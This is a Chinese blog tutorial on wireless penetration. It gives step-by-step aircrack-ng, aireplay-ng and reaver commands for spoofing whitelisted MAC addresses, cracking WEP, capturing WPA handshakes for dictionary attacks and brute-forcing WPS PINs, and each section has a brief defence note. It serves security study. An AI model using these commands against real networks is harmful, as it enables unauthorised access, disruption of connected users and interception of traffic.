---
title: 无线攻击示例
date: 2018-06-13 00:00:00
categories:
- CTF/WIFI
tags: 无线安全
--- 

## 攻击情景——渗透网络

渗透进入受保护的无线网络

### MAC白名单

在网络上经常见到有人采用开放式无密码的无线配置，然后将设置MAC地址白名单当做非常安全可靠的访问控制机制，但这其实是非常愚蠢的！

#### 原理

MAC地址可以伪造，并且已经连接上相应AP的终端设备，其MAC地址可被嗅探而且必然在白名单中。

#### 方法

- 通过airodump-ng嗅探到可以连接到目标AP的终端设备的MAC地址
- 利用操作系统中各种自带工具修改本机网卡MAC地址即可

老版kali中可以利用macchanger这种工具来完成MAC地址的伪造：

```
root@kali:~# ifconfig wlan0 down
root@kali:~# macchanger -m 00:11:22:33:44:55 wlan0
root@kali:~# ifconfig wlan0 up
```

但是笔者在实践过程中发现每次启动网卡时MAC地址仍无法修改，又尝试去关闭network-manager服务也没有效果。也许是这种方法在新版本中已经不需要了吧。

在新版kali中可以直接在网络管理的图形界面中找到针对连接到每一个热点的配置，在identity的Cloned Address中填写伪造的MAC地址即可。

> 注：因为这里已经伪造了MAC地址，所以当前网络中存在了两个相同ip相同mac的设备，丢包率会大大增加。而且这里如果采取开放式的热点，所有不加密的上层通信数据是可以直接被嗅探到的。

#### 防御

采用高强度密码的WPA/WPA2安全机制，不要相信MAC地址白名单这种访问控制方法

### 破解密码——WEP

#### 原理

WEP安全机制被证明是存在漏洞的：利用已知的初始矢量IV和第一个字节密钥流输出，并结合RC4密钥方案的特点，攻击者通过计算就可以确定WEP密钥。

> 由于WEP加密算法实际上是利用RC4流密码算法作为伪随机数产生器将由初始矢量IV和WEP密钥组合而成的种子生成WEP 密钥流，再由该密钥流与WEP帧数据负载进行异或运算来完成加密运算。而RC4流密码算法是将输入种子密钥进行某种置换和组合运算来生成WEP密钥流的。由于WEP帧中数据负载的第一个字节是逻辑链路控制的802.2头信息，这个头信息对于每个WEP帧都是相同的，攻击者很容易猜测，利用猜的第一个明文字节和WEP帧数据负载密文就可以通过异或运算得到PRNG生成的密钥流中的第一字节。另外，种子密钥中的24比特初始矢量是以明文形式传送的，攻击者可以将其截获，存到初始矢量

参考：深入解析无线WEP和WPA密码及破解原理.doc (附件)

#### 方法

通过重放合法的ARP请求来获得大量的含有iv的密文数据，从而破解密码。攻击过程不难但是较为繁琐，为了便于攻击过程中方便观察，建议用tmux分屏或者直接打开4个终端窗口完成攻击的整个流程。步骤如下：

##### 窗口一

- 扫描附近网络，找到采取WEP方式保护的热点，得到AP的MAC地址以及工作信道

```
root@kali:~# airodump-ng wlan0mon
```

- 针对目标AP进行嗅探并保存文件

```
# airodump-ng --bssid [AP的MAC地址] wlan0mon -w [保存的文件名] -c [信道序号] 

root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
```

窗口一将一直显示最新的嗅探状态，获得与目标AP相连接的STA信息，并且实时保存所有嗅探到的数据包，此时我们的工作区可以切换到窗口二。

##### 窗口二

- 使用aireplay-ng的0号攻击模式，将任意一个与AP连接着的STA打掉线（AP的MAC地址通过窗口一运行着的airodump-ng获得）

```
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

当STA重新与AP进行连接时，挑战应答中的随机数与被秘钥流加密的随机数将被窗口一运行中的airodump-ng捕获识别，并对二者进行异或运算，生成相应的xor文件保存在当前目录下。若此流程被顺利执行，则在窗口一中运行的airodump-ng的右上角则会提示捕捉到xor文件，这时可在窗口二中进行下一步：

- 使用aireplay-ng的1号攻击模式，使攻击机与AP建立关联（不认证），为后续可以成功的重放ARP请求做准备

```
# aireplay-ng -1 [重新关联时间(秒)] -e [AP的名称] -y [捕获的秘钥流文件] -a [AP的MAC地址] -h [本机的MAC地址] wlan0mon

root@kali:~# aireplay-ng -1 60 -e testwifi -y test-xx-xx-xx.tor -a 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
```

此时窗口二运行的aireplay-ng将会一直伪造本机与AP建立关联的数据包，工作区切换到窗口三

##### 窗口三

- 使用aireplay-ng的3号攻击模式，等待捕获合法的ARP请求，捕获后自动重放

```
# aireplay-ng -3 -b [AP的MAC地址] -h [本机的MAC地址] wlan0mon

root@kali:~# aireplay-ng -3 -b 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
```

此时窗口三运行的aireplay-ng将会一直在识别是否捕获到合法的ARP数据包，工作区切换到窗口四

##### 窗口四

- 为了让窗口三中的aireplay-ng捕获到合法的ARP数据包，继续使用aireplay-ng的0号攻击模式将STA打掉线

```
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

- 当STA与AP重新关联并认证时，可见窗口三种捕获到合法ARP请求，开始重放。同时也可见窗口一种的DATA字段的数值在快速的增长，当DATA的值大于一定数量时（5w+就差不多），即可使用aircrack-ng破解密码：

```
root@kali:~# aircrack-ng test-01.cap
```

#### 防御

采用高强度密码的WPA/WPA2安全机制，不要采取WEP安全机制

### 破解密码——WPA/WPA2

#### 原理

当认证过程中的握手包被嗅探到时，则可以对共享秘钥进行离线的爆破。

> 在四步握手中的前两步中，可以获得除共享秘钥和ESSID以外，用来生成PTK的所有参数，以及正确的PTK的MIC校验。目标AP的ESSID也是可知的，所以即可通过本地计算的方式来爆破共享秘钥。

![image](http://etutorials.org/shared/images/tutorials/tutorial_57/08fig17.gif)

参考：

[WPA-PSK无线网络破解原理及过程](http://www.freebuf.com/articles/wireless/58342.html)

深入解析无线WEP和WPA密码及破解原理.doc (附件)

#### 方法

为了方便操作开启两个终端窗口

##### 窗口一

- 扫描附近网络，找到采取WPA/WPA2方式保护的热点，得到AP的MAC地址以及工作信道

```
root@kali:~# airodump-ng wlan0mon
```

- 针对目标AP进行嗅探并保存文件

```
# airodump-ng --bssid [AP的MAC地址] wlan0mon -w [保存的文件名] -c [信道序号] 

root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
```

窗口一将一直显示最新的嗅探状态，获得与目标AP相连接的STA信息，并且实时保存所有嗅探到的数据包，此时我们的工作区可以切换到窗口二。

##### 窗口二

- 使用aireplay-ng的0号攻击模式，将任意一个与AP连接着的STA打掉线（AP的MAC地址通过窗口一运行着的airodump-ng获得）

```
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

- 当STA重新与AP进行连接时，运行在窗口一种的airodump-ng将会捕捉到认证的握手包并在右上角提示handshake，此时利用aircrack-ng指明字典进行爆破即可

```
root@kali:~# aircrack-ng test-01.cap -w passwd.txt
```

其实最终捕获的数据包中只要有三条数据包就可以进行破解：四步握手的前两步，一个AP的beacon帧（用来获得AP的ESSID）

![image](https://xuanxuanblingbling.github.io/assets/pic/wpa3.png )

#### 密码工具

WPA/WPA2密码破解的重点其实不在于握手包的捕获，而在于密码的破解。如果字典中没有相应的密码是无法破解的，而且在PYK的计算中，4096次hash是相当耗时的，所以如何高效的破解密码才是重中之重，以下介绍四个工具：

##### airolib-ng

##### john

##### cowpatty

##### pyrit

#### 防御

使用复杂密码

### 破解密码——WPS

#### 原理

通过爆破第一种AP PIN的认证方式，即可直接提取共享秘钥

> pin码是一个8位的整数，破解过程时间比较短。WPS PIN码的第8位数是一个校验和，因此黑客只需计算前7位数。另外前7位中的前四位和后三位分开认证。所以破解pin码最多只需要1.1万次尝试，顺利的情况下在3小时左右。

#### 方法

- 通过airodump或者wash嗅探支持WPS的目标：

```
root@kali:~# airodump-ng wlan0mon --wps
root@kali:~# wash -i wlan0mon
```

- 利用reaver穷举破解pin码，并通过获取的pin码得到无线AP上网密码（在利用reaver进行爆破时，貌似不要开airodump-ng或者wash来监听，可能会对爆破产生影响）

```
# reaver -i wlan0mon -b [AP的MAC地址] -vv(输出详细log) -d [延迟时间] 

root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 3
```

参数说明：

```
1. -i 监听后接口称号‍‍
‍‍2. -b APmac地址‍‍
‍‍3. -a 主动检测AP最佳配置‍‍
‍‍4. -S 利用最小的DH key（能够进步PJ速度）‍‍
‍‍5. -v、-vv 显示更多的破解信息‍‍
‍‍6. -d 即delay每穷举一次的闲置时候预设为1秒‍‍
‍‍7. -t 即timeout每次穷举守候反应的最长时候‍‍
‍‍8. -c 指定频道能够便当找到信号，如-c 1 指定1频道
```

- 利用reaver的-K参数调用pixiewps快速破解有漏洞的AP:

```
root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
```

报错参考：[利用 reaver 进行无线安全审计](http://blkstone.github.io/2015/08/19/reaver-tutorial/)

#### 防御

关闭WPS，使用使用复杂密码的WPA/WPA2方式保护无线安全

## 攻击情景——数据监听

## 攻击情景——钓鱼热点

## 后续攻击

## 其他工具

[不止Kali 和 Aircrack-ng 无线渗透工具合集](http://www.4hou.com/tools/5584.html)


